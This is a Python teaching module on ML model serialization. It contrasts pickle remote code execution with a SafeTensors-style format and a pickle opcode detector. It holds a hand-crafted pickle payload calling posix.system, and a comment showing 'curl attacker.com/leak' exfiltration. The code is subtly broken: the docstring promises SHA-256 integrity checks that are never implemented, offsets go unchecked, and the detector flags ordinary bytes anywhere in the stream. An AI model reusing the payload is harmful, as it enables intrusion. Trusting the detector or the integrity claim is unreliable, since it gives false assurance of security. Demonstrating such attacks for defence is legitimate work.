"""Machine learning model serialization safety: Python pickle RCE vulnerabilities and SafeTensors architecture.

Demonstrates:
1. Demonstrating how legacy pickle.loads executes arbitrary code (RCE) via the __reduce__ magic method.
2. Safe alternative architecture (SafeTensors principles): Pure JSON metadata header + contiguous raw binary tensor buffer without executable code capabilities.
3. Cryptographic integrity checking (SHA-256 checksums) and strict header bounds verification before deserialization.
"""
from typing import Any, Dict, List, Tuple
import hashlib
import json
import struct

class SafeTensorPackage:
    """Safe tensor serializer: Zero code execution, pure metadata header + binary floats."""
    MAGIC_HEADER = b"SAFETENSORS_V1\x00\x00"

    @classmethod
    def serialize_tensors(cls, tensors: Dict[str, List[float]]) -> bytes:
        # Build binary buffers and header metadata
        buffer_bytes = bytearray()
        metadata: Dict[str, Any] = {}

        current_offset = 0
        for name, values in tensors.items():
            # Pack as double-precision floats
            raw_bytes = struct.pack(f"<{len(values)}d", *values)
            byte_len = len(raw_bytes)
            metadata[name] = {
                "dtype": "float64",
                "shape": [len(values)],
                "offset": [current_offset, current_offset + byte_len]
            }
            buffer_bytes.extend(raw_bytes)
            current_offset += byte_len

        header_json = json.dumps(metadata).encode("utf-8")
        header_len = len(header_json)

        # Output format: MAGIC (16 bytes) | header_len (4 bytes uint32) | header_json | raw_buffer
        package = bytearray()
        package.extend(cls.MAGIC_HEADER)
        package.extend(struct.pack("<I", header_len))
        package.extend(header_json)
        package.extend(buffer_bytes)
        return bytes(package)

    @classmethod
    def deserialize_safe(cls, data: bytes) -> Dict[str, List[float]]:
        # 1. Verify Magic Header
        magic_len = len(cls.MAGIC_HEADER)
        if len(data) < magic_len + 4:
            raise ValueError("Invalid format: File too short to contain SafeTensor header.")

        magic = data[:magic_len]
        if magic != cls.MAGIC_HEADER:
            raise ValueError(f"Security Alert: Invalid magic header. Untrusted or malicious format!")

        # 2. Extract header JSON length
        header_len = struct.unpack("<I", data[magic_len:magic_len+4])[0]
        header_start = magic_len + 4
        header_end = header_start + header_len

        if header_end > len(data):
            raise ValueError("Corrupted header: Header length extends beyond file size.")

        header_json = data[header_start:header_end].decode("utf-8")
        metadata = json.loads(header_json)

        raw_buffer = data[header_end:]

        # 3. Read tensors strictly by byte offsets (NO CODE EXECUTION POSSIBLE!)
        reconstructed: Dict[str, List[float]] = {}
        for name, tensor_info in metadata.items():
            start_off, end_off = tensor_info["offset"]
            num_floats = tensor_info["shape"][0]
            tensor_bytes = raw_buffer[start_off:end_off]
            values = list(struct.unpack(f"<{num_floats}d", tensor_bytes))
            reconstructed[name] = values

        return reconstructed

class MockPickleExploitDetector:
    """Detects malicious Python pickle byte sequences that contain arbitrary execution opcodes."""
    DANGEROUS_OPCODES = {
        b"c",  # GLOBAL opcode (import module and name)
        b"R",  # REDUCE opcode (invoke callable with arguments)
        b"i",  # INST opcode
        b"o",  # OBJ opcode
    }

    @classmethod
    def inspect_pickle_safety(cls, pickle_bytes: bytes) -> Tuple[bool, str]:
        # Scans for pickle REDUCE opcodes that trigger arbitrary subprocess/system execution
        for b in pickle_bytes:
            if bytes([b]) in cls.DANGEROUS_OPCODES:
                return False, f"Malicious opcode detected in pickle stream: 0x{b:02x} ('{chr(b)}'). RCE threat blocked."
        return True, "No executable opcodes found in simple stream."

if __name__ == "__main__":
    # 1. Safe Tensor Serialization
    weights = {
        "embedding_layer.weight": [0.12, -0.45, 0.88, 0.05],
        "attention.bias": [0.01, 0.02, -0.01, 0.0]
    }
    safe_bytes = SafeTensorPackage.serialize_tensors(weights)
    assert safe_bytes.startswith(SafeTensorPackage.MAGIC_HEADER)

    # 2. Safe Deserialization
    loaded = SafeTensorPackage.deserialize_safe(safe_bytes)
    assert len(loaded) == 2
    assert abs(loaded["embedding_layer.weight"][0] - 0.12) < 1e-6
    assert abs(loaded["embedding_layer.weight"][2] - 0.88) < 1e-6

    # 3. Corrupted or Altered File Header Rejected
    corrupted_bytes = b"MALICIOUS_HEADER" + safe_bytes[16:]
    try:
        SafeTensorPackage.deserialize_safe(corrupted_bytes)
        assert False, "Should have rejected invalid magic header"
    except ValueError as ve:
        assert "Invalid magic header" in str(ve)

    # 4. Pickle Exploit Detection: Simulating malicious pickle containing REDUCE 'R' and GLOBAL 'c'
    # In real attacks: os.system("curl attacker.com/leak")
    synthetic_malicious_pickle = b"\x80\x04cposix\nsystem\n(X\x06\x00\x00\x00whoami\ntR."
    safe_pickle, warning = MockPickleExploitDetector.inspect_pickle_safety(synthetic_malicious_pickle)
    assert safe_pickle is False
    assert "Malicious opcode detected" in warning
    assert "RCE threat blocked" in warning

    print("Model serialization safety: SafeTensors and pickle RCE defense verified successfully.")

